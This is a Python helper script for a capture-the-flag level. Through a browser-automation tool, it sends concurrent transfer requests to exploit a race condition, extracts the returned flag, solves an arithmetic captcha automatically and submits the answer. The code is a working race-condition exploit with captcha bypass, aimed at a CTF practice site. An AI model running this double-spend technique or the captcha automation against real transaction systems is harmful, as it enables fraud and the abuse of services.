import argparse
import json
import os
import re
import shutil
import subprocess
import sys


DEFAULT_START_PATH = "/api/levels/9/start"
DEFAULT_TRANSFER_PATH = "/api/levels/9/transfer"
DEFAULT_STATUS_PATH = "/api/levels/9/status"
DEFAULT_ANSWER_PATH = "/api/levels/9/answer"
DEFAULT_CAPTCHA_PATH = "/api/captcha"


def resolve_agent_browser() -> str:
    env_value = os.environ.get("AGENT_BROWSER_BIN")
    if env_value:
        return env_value

    exe_candidate = os.path.expandvars(
        r"%APPDATA%\npm\node_modules\agent-browser\bin\agent-browser-win32-x64.exe"
    )
    if os.path.exists(exe_candidate):
        return exe_candidate

    for candidate in ("agent-browser", "agent-browser.ps1", "agent-browser.cmd"):
        resolved = shutil.which(candidate)
        if resolved:
            return resolved

    raise FileNotFoundError("agent-browser executable not found")


def run_agent(*args: str) -> str:
    result = subprocess.run(
        [resolve_agent_browser(), *args],
        capture_output=True,
        text=True,
        encoding="utf-8",
    )
    if result.returncode != 0:
        raise RuntimeError(
            f"agent-browser failed ({result.returncode})\nSTDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
        )
    return result.stdout.strip()


def list_tabs() -> str:
    return run_agent("tab", "list")


def find_ctf_tab() -> int | None:
    output = list_tabs()
    candidates: list[int] = []
    for line in output.splitlines():
        line = line.strip()
        if not (line.startswith("[") or line.startswith("→ [")):
            continue
        if "https://ctf.centos.hk/" not in line:
            continue

        start = line.find("[")
        end = line.find("]", start + 1)
        if start == -1 or end == -1:
            continue
        candidates.append(int(line[start + 1 : end]))
    return candidates[-1] if candidates else None


def switch_tab(tab: int | None) -> None:
    target = tab if tab is not None else find_ctf_tab()
    if target is not None:
        run_agent("tab", str(target))


def browser_eval(js: str) -> str:
    return run_agent("eval", js)


def browser_fetch_json(path: str, method: str = "GET", body: dict | None = None) -> dict:
    body_json = json.dumps(body, ensure_ascii=False) if body is not None else None
    js = (
        "(async()=>{"
        f"const options={{method:{json.dumps(method)},headers:{{'Content-Type':'application/json'}}"
        + (f",body:JSON.stringify({body_json})" if body_json is not None else "")
        + "};"
        f"const response=await fetch({json.dumps(path)},options);"
        "return JSON.stringify(await response.json());"
        "})()"
    )
    raw = browser_eval(js)
    parsed = json.loads(raw)
    if isinstance(parsed, str):
        parsed = json.loads(parsed)
    return parsed


def solve_captcha(question: str) -> int:
    match = re.search(r"(-?\d+)\s*([+\-*/xX])\s*(-?\d+)", question)
    if not match:
        raise ValueError(f"unsupported captcha: {question}")

    left = int(match.group(1))
    operator = match.group(2)
    right = int(match.group(3))

    if operator == "+":
        return left + right
    if operator == "-":
        return left - right
    if operator in ("*", "x", "X"):
        return left * right
    if operator == "/":
        return left // right
    raise ValueError(f"unsupported captcha operator: {question}")


def normalize_flag(value: str) -> str:
    text = value.strip()
    match = re.fullmatch(r"muyuan\{(.+)\}", text)
    return match.group(1) if match else text


def race_once(start_path: str, transfer_path: str, status_path: str, amount: int, concurrency: int) -> dict:
    js = f"""
    (async()=>{{
      const start = await (await fetch({json.dumps(start_path)}, {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }}
      }})).json();
      const body = {{ sessionKey: start.sessionKey, amount: {amount} }};
      const req = () => fetch({json.dumps(transfer_path)}, {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify(body)
      }}).then(r => r.json());
      const transfers = await Promise.all(Array.from({{ length: {concurrency} }}, req));
      const status = await (await fetch({json.dumps(status_path)} + '?sessionKey=' + start.sessionKey)).json();
      return JSON.stringify({{ start, transfers, status }});
    }})()
    """
    raw = browser_eval(" ".join(line.strip() for line in js.splitlines()))
    parsed = json.loads(raw)
    if isinstance(parsed, str):
        parsed = json.loads(parsed)
    return parsed


def submit_answer(flag: str, captcha_path: str, answer_path: str) -> dict:
    captcha = browser_fetch_json(captcha_path)
    captcha_answer = solve_captcha(captcha["question"])
    return browser_fetch_json(
        answer_path,
        method="POST",
        body={
            "answer": f"muyuan{{{normalize_flag(flag)}}}",
            "captchaId": captcha["id"],
            "captchaAnswer": captcha_answer,
        },
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Level 9 race condition helper")
    parser.add_argument("--tab", type=int)
    parser.add_argument("--start-path", default=DEFAULT_START_PATH)
    parser.add_argument("--transfer-path", default=DEFAULT_TRANSFER_PATH)
    parser.add_argument("--status-path", default=DEFAULT_STATUS_PATH)
    parser.add_argument("--answer-path", default=DEFAULT_ANSWER_PATH)
    parser.add_argument("--captcha-path", default=DEFAULT_CAPTCHA_PATH)
    parser.add_argument("--amount", type=int, default=50)
    parser.add_argument("--concurrency", type=int, default=3)
    parser.add_argument("--submit-level-answer", action="store_true")
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    switch_tab(args.tab)

    result = race_once(
        args.start_path,
        args.transfer_path,
        args.status_path,
        args.amount,
        args.concurrency,
    )
    output: dict = {"race": result}

    flag = None
    for transfer in result["transfers"]:
        if isinstance(transfer, dict) and transfer.get("flag"):
            flag = transfer["flag"]
            break

    if flag:
        output["flag"] = flag
    if args.submit_level_answer and flag:
        output["levelSubmit"] = submit_answer(flag, args.captcha_path, args.answer_path)

    print(json.dumps(output, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
